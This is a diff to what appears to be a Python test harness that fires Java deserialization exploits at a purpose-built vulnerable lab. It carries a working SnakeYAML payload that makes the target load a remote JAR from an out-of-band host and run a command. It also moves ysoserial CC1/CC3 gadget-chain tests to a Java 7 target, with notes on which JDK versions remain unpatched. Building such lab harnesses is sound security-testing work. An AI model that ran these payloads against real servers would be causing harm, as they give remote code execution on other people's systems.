@@ -984,7 +984,7 @@ def test_snakeyaml_chain():
         return
     cmd = EXEC_CMD(tok)
     # JAR server URL: spi-jar-server at :8099 serves /rce.jar?cmd=CMD
-    jar_url = f"http://{OOB_HOST}:8099/rce.jar?cmd={urllib.parse.quote(cmd)}"
+    jar_url = f"http://{OOB_HOST}:8711/spi-jar?cmd={urllib.parse.quote(cmd)}"
     yaml_payload = f"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"{jar_url}\"]]]]"
     code, resp = post_raw(f"{VULNLAB}/snakeyaml", yaml_payload.encode(), "text/plain")
     if code == 0:
@@ -1073,13 +1073,14 @@ def main():
                 "ysoserial_hibernate1"]:
         test_deser_chain(cid)
 
-    print("\n[*] Section 1b: ysoserial chains needing old JVM → java8-old :8891")
-    # cc1/cc3: need Java < 8u232 (AnnotationInvocationHandler fix)
+    print("\n[*] Section 1b: ysoserial cc1/cc3 → java7 :8892 (AIH fix in JDK 8u71+; java7 is pre-patch)")
+    # cc1/cc3: AnnotationInvocationHandler gadget patched in JDK 8u71+; java8-old=8u102 is AFTER patch.
+    # java7 (Zulu JDK 7) is still vulnerable. Both targets have CC3 on classpath.
     for cid in ["ysoserial_cc1","ysoserial_cc3"]:
-        if j8old_ok:
-            test_deser_chain(cid, target_url=JAVA8OLD_URL, container_name="vuln-java8old")
+        if j7_ok:
+            test_deser_chain(cid, target_url=JAVA7_URL, container_name="vuln-java7")
         else:
-            record(cid, "SKIP", "java8-old target not running (:8891)")
+            record(cid, "SKIP", "java7 target not running (needed for CC1/CC3 pre-AIH-patch)")
     # groovy1: MethodClosure SUID differs JDK8 vs JDK17; needs groovy on classpath. Test on vulnlab.
     # Note: will fail on JDK17 vulnlab due to SUID mismatch. Acceptable SKIP until groovy dep resolved.
     test_deser_chain("ysoserial_groovy1")
